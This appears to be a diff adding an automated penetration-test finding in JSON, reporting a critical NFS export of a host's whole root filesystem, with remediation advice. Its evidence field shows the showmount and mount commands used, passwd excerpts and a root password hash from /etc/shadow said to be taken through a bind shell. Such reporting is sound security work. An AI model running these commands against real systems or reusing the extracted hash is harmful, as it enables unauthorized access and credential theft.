@@ -1,0 +1,27 @@
+{
+  "finding_id": "finding_003",
+  "title": "NFS Root Filesystem Export to All Hosts",
+  "severity": "critical",
+  "description": "The NFS server exports the entire root filesystem (/) to all hosts (*) with no access restrictions. Any host on the network can mount the entire filesystem and read sensitive files including /etc/passwd. Combined with the root shell, /etc/shadow with password hashes was also extracted.",
+  "affected_hosts": [
+    "192.168.0.140"
+  ],
+  "evidence": "showmount -e 192.168.0.140:\\nExport list for 192.168.0.140:\\n/ *\\n\\nAfter mounting:\\nmount -t nfs 192.168.0.140:/ /tmp/nfs_mount -o nolock\\n\\n/etc/passwd readable:\\nroot:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/bin/sh\\nbin:x:2:2:bin:/bin:/bin/sh\\n\\n/etc/shadow (obtained via root bind shell):\\nroot:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::",
+  "cvss_score": 9.8,
+  "remediation": "Restrict NFS exports to specific hosts and subnets. Never export the root filesystem. Use NFSv4 with Kerberos authentication.",
+  "references": [
+    "CWE-732",
+    "CVE-1999-0170"
+  ],
+  "exploitable": true,
+  "exploitation_status": "CONFIRMED",
+  "discovered_at": "2026-03-01T18:01:18.725080",
+  "assessment_id": "test4",
+  "evidence_validation": {
+    "quality": "acceptable",
+    "score": 25,
+    "issues": [],
+    "suggestions": [],
+    "has_exploitation_proof": true
+  }
+}
